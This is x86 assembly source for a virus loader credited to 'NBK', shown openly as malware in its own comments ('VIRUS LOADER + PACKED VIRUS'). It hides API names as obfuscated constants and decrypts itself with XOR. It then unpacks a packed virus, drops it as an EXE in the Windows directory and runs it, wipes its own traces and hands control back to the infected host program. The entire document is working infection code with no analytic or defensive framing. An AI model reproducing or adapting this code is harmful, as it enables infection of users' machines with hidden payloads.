   ;***************************************************************
   ;*                                                             *
   ;*         LOADER v1.0       Copyright (c) by NBK              *
   ;*                                                             *
   ;*                    9xx bytes lenght                        *
   ;***************************************************************

   loader@ini:

   pushf
   pushad
   call delta

   push 0
   mov eax, not '23LE'
   not eax
   push eax
   xor eax, '23LE' xor 'NREK'
   push eax
   push esp
   dw 15ffh
   w_handle@018 dd 0

   add esp, (4*3)

   mov ebx, eax
   test eax, eax
   jz crash@001

   sub esp, 12
   mov edi, esp

   mov eax, not 'tc'
   not eax
   push eax
   xor eax, 'tc' xor 'etor'
   push eax
   xor eax, 'etor' xor 'Plau'
   push eax
   xor eax, 'Plau' xor 'triV'
   push eax
   push esp
   push ebx
   call call_getprocaddress
   mov dword ptr [edi+4], eax   ;   VirtualProtect
   add esp, (4*4)

   lea ecx, [edi+8]
   push ecx
   push 40h                 ;   PAGE_EXECUTE_READWRITE
   push dword ptr [ebp+(offset w_ionumb@012 - offset delta)]   ;   size
   call loader_f_entry
   push eax
   call dword ptr [edi+4]    ;   VirtualProtect

   push dword ptr [edi+8]
   pop dword ptr [ebp+(offset w_ionumb@014 - offset delta)]
   mov eax, [edi+4]
   mov dword ptr [ebp+(offset w_ionumb@015 - offset delta)], eax

   sub esp, -12

   jmp api@002a

   api@002b:

   pop esi
   lea edi, [ebp+(offset api@001 - offset delta)]
   mov ecx, (offset api@002 - offset api@001)/4

   api@003:

   push ecx
   push esi
   push ebx
   call call_getprocaddress
   pop ecx
   test eax, eax
   jz crash@001
   stosd

   api@004:

   lodsb
   test al, al
   jnz api@004
   loop api@003

   loader@alloc:

   db 104
   loadmem@002 dd 0   ;   VIRUS LOADER + PACKED VIRUS + REAL PACKED FILE DATA
   push 40h           ;   GMEM_ZEROINIT
   call dword ptr [ebp+(offset _GlobalAlloc - offset delta)]
   mov dword ptr [ebp+(offset loadmem@003 - offset delta)], eax

   mov edi, eax
   test eax, eax
   jz crash@001

   lea esi, [ebp+(offset loadmem@001 - offset delta)]
   mov ecx, dword ptr [ebp+(offset loadmem@002 - offset delta)]
   cld
   rep movsb
   jmp eax

   loadmem@001:

   call delta
   call label@001

   mutex@001 label

   dd 'iBAS'/2 + 'AAAA'
   dd 'II-Á'/2 + 'AAAA',0

   include _depack.INC

   delta:
   db 0e8h
   dd 0
   pop ebp
   sub ebp, 5
   ret

   label@001:

   mov ecx, (offset label@003 - offset label@002)/4
   lea esi, [ebp+(offset label@002 - offset delta)]
   mov edx, 12345678h
   xor_hide_proc equ dword ptr $-4

   validate_proc:

   xor [esi], edx
   lodsd
   loop validate_proc

   label@002 label

   mov eax, [ebp+(offset w_handle@014 - offset delta)]
   add eax, [ebp+(offset w_ionumb@010 - offset delta)]
   lea edi, [ebp+(offset loader@end - offset delta)]
   sub edi, 4
   mov esi, edi
   xor [esi], 12345678h
   xor_hide equ dword ptr $-4

   sub edx, edx
   mov ecx, 4
   div ecx
   mov ecx, eax

   cld
   lodsd
   mov ebx, eax
   not eax
   stosd

   decrypt@001:

   lodsd
   push eax
   xor eax, ebx
   pop ebx
   stosd
   loop decrypt@001

   push TRUE
   push 00100000h
   call dword ptr [ebp+(offset _OpenMutexA - offset delta)]

   test eax, eax
   jz mutex@ini

   push eax
   call dword ptr [ebp+(offset _CloseHandle - offset delta)]

   jmp saida@001   ;   Virus in memory, back to original file...

   mutex@ini:

   sub esp, 256
   mov ebx, esp

   push MAX_PATH
   push ebx
   call dword ptr [ebp+(offset _GetWindowsDirectoryA - offset delta)]

   mov edi, ebx
   add edi, eax

   ; <\ G .EXE>

   push 0
   mov eax, not 'EXE.'
   not eax
   push eax
   xor eax, 'EXE.' xor ' G \'
   push eax
   mov esi, esp
   mov ecx, 9
   rep movsb
   add esp, (4*3)

   call loader_f_entry
   push eax
   mov edi, eax

   lea eax, [ebp+(offset loader@end - offset delta)]
   push eax
   call _aP_depack_asm

   xor eax, eax
   push eax
   push eax
   push 2   ;   CREATE_ALWAYS
   push eax
   inc eax
   push eax
   push GENERIC_READ or GENERIC_WRITE
   push ebx
   call dword ptr [ebp+(offset _CreateFileA - offset delta)]
   mov esi, eax

   xor eax, eax
   push eax
   mov ecx, esp
   push eax
   push ecx
   push SII
   push edi
   push esi   ;   dword ptr [ebp+(offset handle@001 - offset delta)]
   call dword ptr [ebp+(offset _WriteFile - offset delta)]
   pop ecx

   test eax, eax
   jz saida@004

   push esi   ;   dword ptr [ebp+(offset handle@001 - offset delta)]
   call dword ptr [ebp+(offset _CloseHandle - offset delta)]

   ; Getting some basic info.

   sub esp, 80
   mov edi, esp
   push edi
   call dword ptr [ebp+(offset _GetStartupInfoA - offset delta)]

   ; Little boy spawned, let's play it

   sub esp, 20
   mov eax, esp
   push eax
   push edi
   xor eax, eax
   push eax
   push eax
   push 20h   ;   NORMAL_PRIORITY_CLASS
   push eax
   push eax
   push eax
   push eax
   push ebx
   call dword ptr [ebp+(offset _CreateProcessA - offset delta)]

   add esp, (256 + 80 + 20)

   saida@001:

   call loader_f_entry
   push eax

   label@003 label

   lea eax, [(ebp+offset loader@end - offset delta)]
   db 5
   w_handle@014 dd 0   ;   size of virus packed code
   push eax

   call _aP_depack_asm

   jmp saida@002

   crash@001:

   popad
   popf
   xor eax, eax   ;   try to quit ... and no error
   ret

   handle@001 dd 0

   saida@004:

   add esp, 256
   jmp saida@001

   w_ionumb@010 dd 0   ;   size of packed data

   call_getprocaddress:

   dw 25ffh
   w_handle@017 dd 0

   api@002a:

   call api@002b

   db 'CreateFileA',0
   db 'WriteFile',0
   db 'CloseHandle',0
   db 'OpenMutexA',0
   db 'GetWindowsDirectoryA',0
   db 'CreateProcessA',0
   db 'GetStartupInfoA',0
   db 'GlobalAlloc',0
   db 'GlobalFree',0

   saida@002:

   mov ecx, (offset saida@003 - offset loadmem@001)

   db 184
   loadmem@003 dd 0   ;   HANDLE GlobalAlloc()
   cld
   mov edi, eax

   saida@003:

   rep stosb   ;   erases memory

   push eax
   call dword ptr [ebp+(offset _GlobalFree - offset delta)]

   push eax
   mov edx, esp

   call loader_f_entry
   xchg eax, edx

   push eax
   db 104
   w_ionumb@014 dd 0   ;   last acess type
   db 104
   w_ionumb@012 dd 0   ;   section size
   push edx            ;   Offset
   db 184
   w_ionumb@015 dd 0   ;   VirtualProtect
   call eax

   pop eax
   popad
   popf
   jmp eax

   loader_f_entry:

   mov eax, 12345678h
   w_ionumb@001 equ dword ptr $-4   ;   imagebase
   add eax, 12345678h
   w_ionumb@004 equ dword ptr $-4   ;   entrypoint
   ret

   api@001 label

   _CreateFileA dd 0
   _WriteFile dd 0
   _CloseHandle dd 0
   _OpenMutexA dd 0
   _GetWindowsDirectoryA dd 0
   _CreateProcessA dd 0
   _GetStartupInfoA dd 0
   _GlobalAlloc dd 0
   _GlobalFree dd 0

   api@002 label

   db 'L_END'

   rnd_loader dd 12345678h

   loader@end:
